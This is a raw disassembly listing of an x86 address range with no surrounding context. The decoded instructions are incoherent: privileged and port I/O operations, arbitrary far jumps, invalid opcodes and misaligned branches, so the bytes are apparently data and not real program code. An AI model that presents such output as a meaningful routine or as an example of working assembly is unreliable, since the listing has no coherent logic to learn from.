  40b45b:	dec    edx
  40b45c:	add    eax,0x5e0585a8
  40b461:	mov    eax,ds:0xe6e9f4ec
  40b466:	xchg   ebp,eax
  40b467:	xor    DWORD PTR [edi+edx*8-0x26680b6f],ebp
  40b46e:	jp     0x40b44e
  40b470:	xor    ch,bh
  40b472:	mov    al,0xd8
  40b474:	fwait
  40b475:	mov    ecx,0x9ca962a5
  40b47a:	mov    BYTE PTR [edx-0x11],0x85
  40b47e:	cli    
  40b47f:	outs   dx,DWORD PTR ds:[esi]
  40b480:	pop    edi
  40b481:	jmp    0x9e6d:0xb0d887dc
  40b488:	fist   WORD PTR [ebx+0x3c08f7e2]
  40b48e:	inc    edx
  40b48f:	sbb    DWORD PTR [edi-0x5f],ecx
  40b492:	ins    BYTE PTR es:[edi],dx
  40b493:	sbb    dl,BYTE PTR [ecx-0x2105257d]
  40b499:	sbb    BYTE PTR [edi-0x37],0xf0
  40b49d:	or     ah,dh
  40b49f:	inc    dl
  40b4a1:	cmc    
  40b4a2:	push   cs
  40b4a3:	adc    BYTE PTR [esi-0x750bb1db],ch
  40b4a9:	add    ecx,DWORD PTR [ebp+0x15]
  40b4ac:	inc    edx
  40b4ad:	push   esi
  40b4ae:	xchg   edi,eax
  40b4af:	arpl   WORD PTR [edi],bp
  40b4b1:	jo     0x40b507
  40b4b3:	xchg   ebx,eax
  40b4b4:	int3   
  40b4b5:	dec    ecx
  40b4b6:	arpl   WORD PTR [edi+ebx*1+0x735b95bd],si
  40b4bd:	sar    dh,0x3d
  40b4c0:	(bad)  [eax]
  40b4c2:	sub    ah,BYTE PTR [ebx]
  40b4c4:	jbe    0x40b4f5
  40b4c6:	or     BYTE PTR [ebp+0x1ea2690a],cl
  40b4cc:	jecxz  0x40b547
  40b4ce:	add    edx,DWORD PTR ss:[ebx+esi*2+0x1e]
  40b4d3:	or     bh,BYTE PTR [eax+0x5c2d6f34]
  40b4d9:	scas   al,BYTE PTR es:[edi]
  40b4da:	and    ebx,esi
  40b4dc:	sbb    eax,0x276cdde1
  40b4e1:	jne    0x40b529
  40b4e3:	mov    ds:0xf3356b4,eax
  40b4e8:	arpl   ax,si
  40b4ea:	not    DWORD PTR [ebx-0x525a0e57]
  40b4f0:	les    ecx,FWORD PTR [edi-0x39e5378c]
  40b4f6:	(bad)  
  40b4f7:	push   esp
  40b4f8:	jns    0x40b54d
  40b4fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b4fb:	cmp    bl,BYTE PTR [esi-0x4f]
  40b4fe:	adc    BYTE PTR [ebx],0x64
  40b501:	ret    0xd980
  40b504:	daa    
  40b505:	and    BYTE PTR [esp+eiz*8-0x73ce795b],ah
  40b50c:	fisttp DWORD PTR [ebx+edx*8-0x1b]
  40b510:	out    dx,al
  40b511:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b512:	adc    al,0x34
  40b514:	add    BYTE PTR [edx-0x20],al
  40b517:	or     BYTE PTR [ebp+0x4c],0x79
  40b51b:	add    al,0x6f
  40b51d:	call   0x4073:0x75340d1d
  40b524:	jmp    0x9e46:0x887d7c9
  40b52b:	(bad)  
  40b52c:	and    BYTE PTR [ebp+0x2885386],al
  40b532:	jl     0x40b56f
  40b534:	jne    0x40b505
  40b536:	in     eax,dx
  40b537:	outs   dx,BYTE PTR ds:[esi]
  40b538:	lock xor esi,DWORD PTR [edx+0x60]
  40b53c:	stos   BYTE PTR es:[edi],al
  40b53d:	cmc    
  40b53e:	sub    ecx,DWORD PTR [ecx-0x55648fe2]
  40b544:	and    al,BYTE PTR [ecx+eiz*4-0xc]
  40b548:	das    
  40b549:	sbb    BYTE PTR [ebp-0xb50a66c],0xa3
  40b550:	sti    
  40b551:	push   es
  40b552:	jns    0x40b599
  40b554:	sbb    al,0x3d
  40b556:	int    0x34
  40b558:	fcmovne st,st(7)
  40b55a:	jmp    FWORD PTR [edi+0x4f]
  40b55d:	jge    0x40b5bd
  40b55f:	outs   dx,BYTE PTR ds:[esi]
  40b560:	jno    0x40b509
  40b562:	jmp    0x3637c1a
  40b567:	hlt    
  40b568:	lss    edi,FWORD PTR [edi-0x61]
  40b56c:	push   ebx
  40b56d:	xlat   BYTE PTR ds:[ebx]
  40b56e:	mov    es,WORD PTR [esi]
  40b570:	fld    TBYTE PTR [edi]
  40b572:	std    
  40b573:	mov    cl,0x4
  40b575:	stc    
  40b576:	sbb    BYTE PTR [edx+0x70e13821],0x68
  40b57d:	sbb    BYTE PTR [ecx-0x5f],dl
  40b580:	clts   
  40b582:	fmul   st,st(5)
  40b584:	xchg   BYTE PTR [ebx+0x79cb6a9a],dl
  40b58a:	pushf  
  40b58b:	hlt    
  40b58c:	push   esp
  40b58d:	les    edx,FWORD PTR [ecx-0x2a]
  40b590:	loope  0x40b5fd
  40b592:	cmp    eax,0x3ed1b47d
  40b597:	pop    ebx
  40b598:	jl     0x40b546
  40b59a:	inc    ebp
  40b59b:	lods   eax,DWORD PTR ds:[esi]
  40b59c:	aas    
  40b59d:	clc    
  40b59e:	test   al,0xf5
  40b5a0:	push   0xffffffc6
  40b5a2:	jb     0x40b582
  40b5a4:	mov    al,ds:0x41a046b7
  40b5a9:	sub    eax,0xcae714e6
  40b5ae:	(bad)  
  40b5af:	and    BYTE PTR [eiz*1-0x45400aac],ch
  40b5b6:	iret   
  40b5b7:	clc    
  40b5b8:	iret   
  40b5b9:	inc    esp
  40b5ba:	mov    ebx,0xfdbe3308
  40b5bf:	or     al,BYTE PTR [eax-0x36986292]
  40b5c5:	jmp    0x1803:0x7f9e7007
  40b5cc:	add    esp,ecx
  40b5ce:	int3   
  40b5cf:	ror    DWORD PTR [edi-0x71],0x31
  40b5d3:	leave  
  40b5d4:	pop    esi
  40b5d5:	popa   
  40b5d6:	push   ebp
  40b5d7:	jmp    0x51d70928
  40b5dc:	test   BYTE PTR [ebx+0x5c],0x51
  40b5e0:	push   ebp
  40b5e1:	push   0x1d
  40b5e3:	push   edi
  40b5e4:	test   DWORD PTR [edx-0x2b],ecx
  40b5e7:	outs   dx,BYTE PTR ds:[esi]
  40b5e8:	(bad)  
  40b5e9:	sar    ch,0x4b
  40b5ec:	jl     0x40b5f1
  40b5ee:	add    DWORD PTR [edi-0x61102e2a],esp
  40b5f4:	or     BYTE PTR [eax+0x422dae48],bl
  40b5fa:	gs sub eax,0x5ad1b4d7
  40b600:	fild   WORD PTR [ebp+0x4e836528]
  40b606:	repnz sbb DWORD PTR [ebx+0x6c013534],edx
  40b60d:	cmp    DWORD PTR [edi+eax*2],ecx
  40b610:	test   al,0xb1
  40b612:	ja     0x40b672
  40b614:	sbb    BYTE PTR [edx+0x56],dh
  40b617:	in     eax,dx
  40b618:	int3   
  40b619:	loopne 0x40b68e
  40b61b:	mov    bl,0x59
  40b61d:	cmp    al,0x27
  40b61f:	jb     0x40b5ed
  40b621:	cmc    
  40b622:	mov    bl,0x64
  40b624:	mov    dl,0x1a
  40b626:	xlat   BYTE PTR ds:[ebx]
  40b627:	mov    bl,0x7a
  40b629:	sbb    ecx,DWORD PTR [esi-0x4375196c]
  40b62f:	data16 adc BYTE PTR [eax+0x2e],al
  40b633:	jg     0x40b5d7
  40b635:	or     edx,DWORD PTR [ebp+0x1]
  40b638:	xchg   esp,eax
  40b639:	sbb    al,0x1b
  40b63b:	mov    cl,0x7b
  40b63d:	enter  0x9d83,0x2a
  40b641:	scas   al,BYTE PTR es:[edi]
  40b642:	sahf   
  40b643:	(bad)
  40b648:	imul   ebx,DWORD PTR [ecx+0x1ab1a19b],0x2c
  40b64f:	stc    
  40b650:	cmp    ecx,DWORD PTR ds:0x7803cb38
  40b656:	cmp    BYTE PTR [edi+esi*4+0x1f0e7f80],cl
  40b65d:	fstp   TBYTE PTR [ecx+ebp*2-0x5f]
  40b661:	std    
  40b662:	ins    BYTE PTR es:[edi],dx
  40b663:	data16 loopne 0x40b614
  40b666:	jno    0x40b6c2
  40b668:	add    BYTE PTR [edx+eax*2],dh
  40b66b:	sti    
  40b66c:	pop    ss
  40b66d:	xchg   edx,eax
  40b66e:	in     al,dx
  40b66f:	ss ret 0xd60c
  40b673:	sbb    BYTE PTR [ebx+0x61],cl
  40b676:	gs mov edi,0x5cd2bf1f
  40b67c:	addr16 jno 0x40b673
  40b67f:	dec    eax
  40b680:	jp     0x40b606
  40b682:	mov    bl,0x1a
  40b684:	mov    ecx,0x50b18ba1
  40b689:	add    dh,BYTE PTR [edi-0x21]
  40b68c:	stc    
  40b68d:	in     al,dx
  40b68e:	jae    0x40b6c3
  40b690:	out    0x99,eax
  40b692:	cmp    edi,DWORD PTR [edi+eiz*1]
  40b695:	shr    DWORD PTR [edi+0x76288567],cl
  40b69b:	mov    eax,ds:0x59056502
  40b6a0:	ret    0x6288
  40b6a3:	and    DWORD PTR [ecx],ecx
  40b6a5:	jno    0x40b6dc
  40b6a7:	and    BYTE PTR [edx-0x472cfb3f],ch
  40b6ad:	aad    0xdb
  40b6af:	inc    edi
  40b6b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6b1:	inc    ebp
  40b6b2:	mov    ecx,0xf34612b5
  40b6b7:	loopne 0x40b65a
  40b6b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6ba:	sahf   
  40b6bb:	test   BYTE PTR [edi],cl
  40b6bd:	push   ebx
  40b6be:	add    BYTE PTR [edx+0x1aa419e4],cl
  40b6c4:	pusha  
  40b6c5:	xchg   DWORD PTR [edx-0x8],edx
  40b6c8:	jae    0x40b65b
  40b6ca:	ror    BYTE PTR [esi-0x12f11e67],1
  40b6d0:	cmp    DWORD PTR [eax+0x2bf37dcf],esi
  40b6d6:	fld    QWORD PTR [edx+0x56]
  40b6d9:	loope  0x40b6d0
  40b6db:	out    dx,eax
  40b6dc:	test   DWORD PTR [ebp+ecx*8+0x48],ebx
  40b6e0:	add    al,0x74
  40b6e2:	mov    al,0xd
  40b6e4:	xchg   edx,eax
  40b6e5:	in     al,0x44
  40b6e7:	xor    al,0xdf
  40b6ea:	popf   
  40b6eb:	aas    
  40b6ec:	mov    DWORD PTR [edi-0x54],ecx
  40b6ef:	cld    
  40b6f0:	clc    
  40b6f1:	loop   0x40b6cf
  40b6f3:	jle    0x40b714
  40b6f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b6f6:	dec    edi
  40b6f7:	sub    bh,BYTE PTR [eax]
  40b6f9:	inc    ebx
  40b6fa:	shl    dl,cl
  40b6fc:	shr    BYTE PTR [esi],cl
  40b6fe:	repnz popa 
  40b700:	cmp    al,0x78
  40b702:	pop    ss
  40b703:	pop    esp
  40b704:	cmp    BYTE PTR [esi-0x49069116],0x7
  40b70b:	cwd    
  40b70d:	shr    BYTE PTR [ebp+0x12],1
  40b710:	xchg   DWORD PTR [eax-0x3e4e7413],esi
  40b716:	cmp    DWORD PTR [esi-0x1811f027],esi
  40b71c:	in     eax,0x3f
  40b71e:	std    
  40b71f:	sar    BYTE PTR [ebx+ebx*8+0xf],1
  40b723:	adc    bl,al
  40b725:	mov    ds:0x813ad091,al
  40b72a:	pop    es
  40b72b:	pop    eax
  40b72c:	sub    DWORD PTR [esi-0x23],0xfffffff5
  40b730:	jae    0x40b6c6
  40b732:	mov    ch,0xaa
  40b734:	(bad)  
  40b735:	out    0x17,eax
  40b737:	jns    0x40b74d
  40b739:	jb     0x40b7a5
  40b73b:	jnp    0x40b6ef
  40b73d:	leave  
  40b73e:	clc    
  40b73f:	push   ss
  40b740:	test   al,0xc0
  40b742:	mov    dh,BYTE PTR [edx-0x54e21ca7]
  40b748:	stc    
  40b749:	sbb    BYTE PTR [edi+0x1a],bl
  40b74c:	cld    
  40b74d:	mov    ebx,0x33c07b2a
  40b752:	leave  
  40b753:	in     eax,dx
  40b754:	cmp    DWORD PTR [eax-0x70],ebp
  40b757:	add    eax,0x3d29ccf3
  40b75c:	call   0x2273:0xbcb4dcd1
  40b763:	leave  
  40b764:	xchg   esp,eax
  40b765:	sub    eax,0x633b6da1
  40b76a:	cdq    
  40b76b:	push   edi
  40b76c:	addr16 pop esi
  40b76e:	and    eax,0x25ab06a8
  40b773:	fist   WORD PTR [edx-0x7730f5d8]
  40b779:	mov    es,WORD PTR [ebx-0x31]
  40b77c:	addr16 inc eax
  40b77e:	dec    eax
  40b77f:	inc    ecx
  40b780:	stos   BYTE PTR es:[edi],al
  40b781:	add    BYTE PTR [ebp+0x4f1b3588],al
  40b787:	mov    dl,0xf6
  40b789:	mov    eax,ds:0xe27770c8
  40b78e:	mov    esi,0xd9f192d4
  40b793:	add    BYTE PTR [edi-0x47ecb2e3],dl
  40b799:	xor    BYTE PTR [ecx+0x7f],ch
  40b79c:	jb     0x40b766
  40b79e:	std    
  40b79f:	cli    
  40b7a0:	dec    eax
  40b7a1:	mov    BYTE PTR [ecx+0x7d],bl
  40b7a4:	cmc    
  40b7a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7a6:	pop    esi
  40b7a7:	pop    es
  40b7a8:	dec    ecx
  40b7a9:	(bad)  [ecx+0x14091871]
  40b7af:	call   0xa32f50b2
  40b7b4:	and    ch,BYTE PTR [edi+0x663d2271]
  40b7ba:	pop    ss
  40b7bb:	mov    ah,0xb8
  40b7bd:	jmp    0x40b787
  40b7bf:	fist   WORD PTR [edx]
  40b7c1:	pop    ebx
  40b7c2:	lock mov dh,0x66
  40b7c5:	mov    cl,0x4b
  40b7c7:	ret    0xd500
  40b7ca:	ja     0x40b752
  40b7cc:	jl     0x40b7b7
  40b7ce:	fidiv  WORD PTR ds:0x4df0bc48
  40b7d4:	icebp  
  40b7d5:	popf   
  40b7d6:	pop    ecx
  40b7d7:	ror    bl,cl
  40b7d9:	mov    edx,0x51f0f6c3
  40b7de:	ins    DWORD PTR es:[edi],dx
  40b7df:	fnstenv [ebx]
  40b7e1:	lea    edi,[edi-0x48]
  40b7e4:	or     al,0xa
  40b7e6:	sub    ebp,DWORD PTR [ebx-0x74014a9e]
  40b7ec:	mov    eax,0xcf58b701
  40b7f1:	inc    edx
  40b7f2:	push   0xe8d2b853
  40b7f7:	xchg   edx,eax
  40b7f8:	push   0x6
  40b7fa:	pop    edi
  40b7fb:	daa    
  40b7fc:	das    
  40b7fd:	adc    al,0xe7
  40b7ff:	jmp    0x7976:0x63d85423
  40b806:	xlat   BYTE PTR ds:[ebx]
  40b807:	xor    DWORD PTR [esp+ebx*1],esp
  40b80a:	xor    cl,BYTE PTR [eax]
  40b80c:	pusha  
  40b80d:	xlat   BYTE PTR ds:[ebx]
  40b80e:	aad    0xa2
  40b810:	xor    bl,ah
  40b812:	mov    ebp,0xdd35c014
  40b817:	xor    eax,0xdb6b7638
  40b81c:	mov    dh,BYTE PTR [edx]
  40b81e:	adc    ebp,0xd2713e63
  40b824:	les    esi,FWORD PTR [esi+0x50]
  40b827:	icebp  
  40b828:	jecxz  0x40b7d4
  40b82a:	push   cs
  40b82b:	call   0x8a2d817f
  40b830:	fst    DWORD PTR [edi]
  40b832:	add    eax,0xa9313559
  40b837:	pop    ebx
  40b838:	adc    al,0x52
  40b83a:	les    esi,FWORD PTR [ebx-0x21]
  40b83d:	pop    edx
  40b83e:	add    eax,0x6b9d5bb8
  40b843:	int    0xd0
  40b845:	xchg   ebp,eax
  40b846:	ins    BYTE PTR es:[edi],dx
  40b847:	hlt    
  40b848:	loope  0x40b88f
  40b84a:	into   
  40b84b:	push   0x620ec587
  40b850:	shl    bh,0x20
  40b853:	xchg   edi,eax
  40b854:	pushf  
  40b855:	pop    ecx
  40b856:	pop    ebp
  40b857:	sub    DWORD PTR [edi-0x63a4bc5c],0x2ad5478a
  40b861:	clc    
  40b862:	xchg   esi,eax
  40b863:	retf   
  40b864:	pop    esp
  40b865:	inc    ebp
  40b866:	or     ah,BYTE PTR [edi-0x41c559bf]
  40b86c:	popa   
  40b86d:	adc    DWORD PTR [ebx+eiz*8],ebx
  40b870:	ins    BYTE PTR es:[edi],dx
  40b871:	push   ds
  40b872:	lods   al,BYTE PTR ds:[esi]
  40b873:	fsubr  DWORD PTR [ebx+0x5cef72d5]
  40b879:	jecxz  0x40b816
  40b87b:	in     eax,dx
  40b87c:	loopne 0x40b8da
  40b87e:	ficom  DWORD PTR [ecx-0x4e228758]
  40b884:	mov    bh,0xa1
  40b886:	les    esi,FWORD PTR [ecx]
  40b888:	pop    ds
  40b889:	sbb    esi,DWORD PTR [edx+0x53bb0e3c]
  40b88f:	dec    edx
  40b890:	xlat   BYTE PTR ds:[ebx]
  40b891:	test   eax,0xd0024bd2
  40b896:	adc    DWORD PTR [eax-0x68],esi
  40b899:	mov    ebp,0x2a560e6d
  40b89e:	jmp    0x40b8bd
  40b8a0:	int    0x9b
  40b8a2:	cmp    al,0x11
  40b8a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b8a5:	cld    
  40b8a6:	add    al,0x6c
  40b8a8:	mov    eax,0x60ecf78e
  40b8ad:	lods   eax,DWORD PTR ds:[esi]
  40b8ae:	(bad)  
  40b8b0:	icebp  
  40b8b1:	shr    ebx,0x5b
  40b8b4:	fs jl  0x40b87d
  40b8b7:	mov    dl,0xd2
  40b8b9:	pop    ecx
  40b8ba:	(bad)  
  40b8bb:	adc    eax,0xec6916fd
  40b8c0:	push   ebx
  40b8c1:	(bad)  
  40b8c2:	rcl    BYTE PTR [ecx],1
  40b8c4:	imul   esi,eax,0x11302318
  40b8ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8cb:	inc    eax
  40b8cc:	es loope 0x40b921
  40b8cf:	jb     0x40b857
  40b8d1:	pop    ebp
  40b8d2:	popa   
  40b8d3:	dec    ebp
  40b8d4:	sbb    DWORD PTR cs:[eax-0x5e],ecx
  40b8d8:	outs   dx,DWORD PTR ds:[esi]
  40b8d9:	cmp    eax,0x13a852c1
  40b8de:	pop    eax
  40b8df:	and    ah,BYTE PTR [edx+edx*2+0x6143bad]
  40b8e6:	shl    cl,1
  40b8e8:	(bad)  
  40b8e9:	sub    BYTE PTR [eax+0x5d367da],bl
  40b8ef:	das    
  40b8f0:	jae    0x40b8b6
  40b8f2:	mov    al,ds:0xed971614
  40b8f7:	add    ebp,0x33
  40b8fa:	call   0xf2bc:0x2a25a1a4
  40b901:	jle    0x40b940
  40b903:	pop    edx
  40b904:	or     BYTE PTR [esi-0x1],al
  40b907:	pop    ds
  40b908:	(bad)  
  40b909:	sti    
  40b90a:	push   edi
  40b90b:	adc    eax,0xd38eff32
  40b910:	mov    ds:0xc15ce7f7,eax
  40b915:	ss sub ch,dh
  40b918:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b919:	sub    ah,BYTE PTR [eax+edi*8+0x35895be8]
  40b920:	ins    BYTE PTR es:[edi],dx
  40b921:	jg     0x40b9a0
  40b923:	ja     0x40b8e3
  40b925:	push   0x6cb04ec1
  40b92a:	cli    
  40b92b:	sub    ch,BYTE PTR [edx]
  40b92d:	pop    edx
  40b92e:	retf   
  40b92f:	mov    edi,0x6b3a95f8
  40b934:	inc    eax
  40b935:	aas    
  40b936:	call   DWORD PTR ss:[ecx]
  40b939:	add    al,0x71
  40b93b:	push   es
  40b93c:	or     BYTE PTR [ebx-0x7ed84f91],0x99
  40b943:	iret   
  40b944:	or     al,0xa5
  40b946:	ffreep st(2)
  40b948:	jbe    0x40b9c9
  40b94a:	cli    
  40b94b:	fsubr  st,st(1)
  40b94d:	push   edi
  40b94e:	mov    bh,0xe8
  40b950:	(bad)  
  40b952:	ud1    edi,DWORD PTR fs:[edx+eax*8-0xef4dca9]
  40b95b:	aas    
  40b95c:	jno    0x40b96c
  40b95e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b95f:	imul   esp,DWORD PTR [esi+0x61],0x86bb21b8
  40b966:	retf   
  40b967:	repnz addr16 dec esi
  40b96a:	xchg   edi,eax
  40b96b:	cmp    ebp,eax
  40b96d:	out    dx,eax
  40b96e:	test   BYTE PTR [ebp-0x3001a25e],dh
  40b974:	jp     0x40b934
  40b976:	int3   
  40b977:	test   DWORD PTR [ecx-0x40],0xdd55b7db
  40b97e:	xor    ch,bl
  40b980:	pop    ds
  40b981:	dec    ebp
  40b982:	jbe    0x40b9a9
  40b984:	pop    esi
  40b985:	pop    edx
  40b986:	xor    BYTE PTR [esi],dh
  40b988:	add    ecx,DWORD PTR [eax-0x1ea4346a]
  40b98e:	imul   esi,DWORD PTR [edx-0x22],0xffffff80
  40b992:	loope  0x40b91d
  40b994:	in     eax,0x8b
  40b996:	and    cl,cl
  40b998:	jle    0x40b970
  40b99a:	jecxz  0x40b961
  40b99c:	or     DWORD PTR [edx+ebx*4+0x67e64504],esp
  40b9a3:	pushw  0xff8b
  40b9a6:	fdivr  DWORD PTR [ebp-0x24]
  40b9a9:	(bad)  
  40b9ab:	rcl    DWORD PTR [eax],1
  40b9ad:	aas    
  40b9ae:	test   dl,0xb6
  40b9b1:	lods   al,BYTE PTR ds:[esi]
  40b9b2:	fld    QWORD PTR [edx]
  40b9b4:	in     eax,dx
  40b9b5:	dec    edi
  40b9b6:	push   ebx
  40b9b7:	xchg   eax,ecx
  40b9b9:	in     al,0x98
  40b9bb:	mov    dh,0xa1
  40b9bd:	cwde   
  40b9be:	mov    bh,0xf6
  40b9c0:	jo     0x40b94e
  40b9c2:	mov    eax,ds:0xa093f3db
  40b9c7:	leave  
  40b9c8:	mov    dh,0x69
  40b9ca:	mov    ebx,0x57b336c0
  40b9cf:	cmp    DWORD PTR [ebx+0x15],eax
  40b9d2:	iret   
  40b9d3:	pop    eax
  40b9d4:	in     al,dx
  40b9d5:	xchg   ebx,eax
  40b9d6:	arpl   WORD PTR [ebx],bx
  40b9d8:	inc    ebx
  40b9d9:	push   ds
  40b9da:	icebp  
  40b9db:	fwait
  40b9dc:	and    DWORD PTR [esi],esi
  40b9de:	and    al,0xc0
  40b9e0:	adc    ebx,eax
  40b9e2:	pop    ecx
  40b9e3:	in     al,dx
  40b9e4:	call   0xd88a:0x8caa56bf
  40b9eb:	jo     0x40ba2b
  40b9ed:	and    DWORD PTR [edi],ebp
  40b9ef:	add    DWORD PTR [edx],0xffffffef
  40b9f2:	push   es
  40b9f3:	push   ds
  40b9f4:	fdiv   DWORD PTR [esi]
  40b9f6:	aad    0x14
  40b9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b9f9:	pop    ecx
  40b9fa:	cmp    al,0xf1
  40b9fc:	shr    bh,cl
  40b9fe:	jns    0x40ba2e
  40ba00:	mov    dh,0xb3
  40ba02:	xchg   ecx,eax
  40ba03:	push   0xa297d76e
  40ba08:	inc    ebx
  40ba09:	ss sbb eax,0x3345fe03
  40ba0f:	push   DWORD PTR ds:0xf350826d
  40ba15:	gs push edi
  40ba17:	loopne 0x40ba6e
  40ba19:	push   edi
  40ba1a:	mov    esi,0xffc53c65
  40ba1f:	jo     0x40ba0e
  40ba21:	ins    DWORD PTR es:[edi],dx
  40ba22:	in     eax,0xfa
  40ba24:	sbb    BYTE PTR [esi+0x6ec5470e],dh
  40ba2a:	lods   eax,DWORD PTR ds:[esi]
  40ba2b:	mov    edx,0x7baf7afe
  40ba30:	cmp    al,0x43
  40ba32:	dec    esp
  40ba33:	mov    ch,BYTE PTR [ecx+ebp*1-0x4f]
  40ba37:	cmp    ebx,DWORD PTR [eax]
  40ba39:	jp     0x40ba4b
  40ba3b:	int    0x92
  40ba3d:	cmc    
  40ba3e:	std    
  40ba3f:	leave  
  40ba40:	aas    
  40ba41:	test   DWORD PTR [edi-0x4bf9907b],0xcb256dd7
  40ba4b:	mov    esp,0xfef9700a
  40ba50:	xor    al,0xef
  40ba52:	daa    
  40ba53:	test   al,0x29
  40ba55:	jbe    0x40bac2
  40ba57:	mov    DWORD PTR [ebx+0x59],ebp
  40ba5a:	mov    eax,ds:0xbd31c013
  40ba5f:	lahf   
  40ba60:	int3   
  40ba61:	mov    ebx,0x472f0703
  40ba66:	outs   dx,BYTE PTR ds:[esi]
  40ba67:	mov    cs,esp
  40ba69:	jmp    0x92b7:0x32b876f9
  40ba70:	aam    0x8f
  40ba72:	pop    edx
  40ba73:	cwde   
  40ba74:	dec    ecx
  40ba75:	xor    al,0x44
  40ba77:	jmp    0x60354f7d
  40ba7c:	jecxz  0x40baeb
  40ba7e:	jecxz  0x40bac9
  40ba80:	fdivr  QWORD PTR [ebp-0x3]
  40ba83:	cmp    DWORD PTR fs:[ebp-0xa],ebp
  40ba87:	dec    ecx
  40ba88:	fidiv  DWORD PTR [esi-0x396fd936]
  40ba8e:	cld    
  40ba8f:	shl    BYTE PTR [esi],cl
  40ba91:	ja     0x40ba8b
  40ba93:	pop    edx
  40ba94:	dec    esi
  40ba95:	repz xchg ecx,eax
  40ba97:	mov    dl,0x40
  40ba99:	cmp    eax,0x6bfe58e8
  40ba9e:	jne    0x40baf4
  40baa0:	out    dx,eax
  40baa1:	adc    eax,0xd305a6
  40baa6:	mov    esi,0xd4327463
  40baab:	call   0xc00:0xfda155d5
  40bab2:	dec    edx
  40bab3:	vsqrtsd xmm6,xmm5,xmm0
  40bab7:	dec    ecx
  40bab8:	dec    edx
  40bab9:	sbb    eax,DWORD PTR [edx+ecx*1]
  40babc:	add    ecx,DWORD PTR [ebp-0x2]
  40babf:	cmp    ebp,edi
  40bac1:	outs   dx,BYTE PTR ds:[esi]
  40bac2:	cmp    al,0x29
  40bac4:	add    esi,DWORD PTR [esi+0x1ec0a2af]
  40baca:	sbb    eax,0x71ebae53
  40bacf:	jnp    0x40babb
  40bad1:	jge    0x40ba6e
  40bad3:	inc    ebp
  40bad4:	sbb    ch,BYTE PTR [edi+ecx*8+0x6beb3f30]
  40badb:	push   cs
  40badc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40badd:	mov    bl,0x8
  40badf:	div    BYTE PTR [esi]
  40bae1:	push   es
  40bae2:	push   ds
  40bae3:	adc    BYTE PTR [esi],bh
  40bae5:	dec    ecx
  40bae6:	out    dx,eax
  40bae7:	mov    edx,0x5b06c344
  40baec:	fisub  WORD PTR [esi+0x3dee8ee7]
  40baf2:	mov    dh,ch
  40baf4:	cmp    eax,0xcdd0d916
  40baf9:	sub    al,0x6b
  40bafb:	shl    DWORD PTR [ebx+0x23aa66fa],1
  40bb01:	add    bh,dh
  40bb03:	call   0xdb7e:0x6d78ded6
  40bb0a:	fucomip st,st(3)
  40bb0c:	sub    cl,BYTE PTR [esi]
  40bb0e:	cld    
  40bb0f:	xlat   BYTE PTR ds:[ebx]
  40bb10:	mov    ds:0x4284c681,eax
  40bb15:	cmp    dh,bl
  40bb17:	dec    esi
  40bb18:	pop    esp
  40bb19:	bound  ebx,QWORD PTR [esp+edx*4+0x76]
  40bb1d:	xor    al,bh
  40bb1f:	adc    eax,0xe4eaef09
  40bb24:	in     eax,dx
  40bb25:	hlt    
  40bb26:	jo     0x40bba2
  40bb28:	sub    bh,BYTE PTR [ebx]
  40bb2a:	xchg   esi,eax
  40bb2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb2c:	scas   al,BYTE PTR es:[edi]
  40bb2d:	xchg   ebp,eax
  40bb2e:	icebp  
  40bb2f:	std    
  40bb30:	jge    0x40bb29
  40bb32:	push   ecx
  40bb33:	leave  
  40bb34:	shr    DWORD PTR [eax+0x61ee57dd],1
  40bb3a:	jg     0x40baf0
  40bb3c:	push   ecx
  40bb3d:	not    DWORD PTR [edi]
  40bb3f:	cld    
  40bb40:	mov    al,ds:0xeeb8bc9
  40bb45:	xor    ebp,edi
  40bb47:	sbb    esi,esp
  40bb49:	pop    ecx
  40bb4a:	jnp    0x40bb33
  40bb4c:	mov    DWORD PTR [eax+eax*4+0x7c],ebp
  40bb50:	jl     0x40bb21
  40bb52:	lods   al,BYTE PTR ds:[esi]
  40bb53:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40bb55:	xchg   esi,eax
  40bb56:	fs push ebx
  40bb58:	sub    eax,0x28c73a16
  40bb5d:	dec    edx
  40bb5e:	stos   BYTE PTR es:[edi],al
  40bb5f:	es xchg esp,eax
  40bb61:	(bad)
  40bb64:	enter  0x704e,0x58
  40bb68:	les    edx,FWORD PTR [edx-0x58c6d455]
  40bb6e:	retf   0x836f
  40bb71:	xchg   ebp,eax
  40bb72:	push   cs
  40bb73:	fadd   st,st(0)
  40bb75:	pop    ebx
  40bb76:	jb     0x40bb64
  40bb78:	(bad)  
  40bb7a:	adc    al,0xe
  40bb7c:	stos   DWORD PTR es:[edi],eax
  40bb7d:	les    ebp,FWORD PTR [ecx+0x5c44f3af]
  40bb83:	jp     0x40bb10
  40bb85:	ret    
  40bb86:	test   eax,0x54d65820
  40bb8b:	pop    edi
  40bb8c:	push   0x53
  40bb8e:	or     al,0xd0
  40bb90:	jg     0x40bb5d
  40bb92:	xor    al,0x7d
  40bb94:	jnp    0x40bb1c
  40bb96:	pop    ss
  40bb97:	loop   0x40bb34
  40bb99:	out    dx,al
  40bb9a:	mov    bl,0xa7
  40bb9c:	lods   eax,DWORD PTR ds:[esi]
  40bb9d:	adc    DWORD PTR [edx+edx*2-0x4c],ebx
  40bba1:	je     0x40bbeb
  40bba3:	jl     0x40bba9
  40bba5:	sbb    DWORD PTR [esi-0x44],esi
  40bba8:	inc    eax
  40bba9:	dec    ebp
  40bbaa:	cmp    al,0x1e
  40bbac:	psadbw mm4,QWORD PTR [esi+0x1da27d62]
  40bbb3:	mov    DWORD PTR [edx-0x6e8374c2],ebp
  40bbb9:	fwait
  40bbba:	push   ss
  40bbbb:	inc    esi
  40bbbc:	test   eax,0xb185e9
  40bbc1:	retf   0xe62a
  40bbc4:	xchg   edi,eax
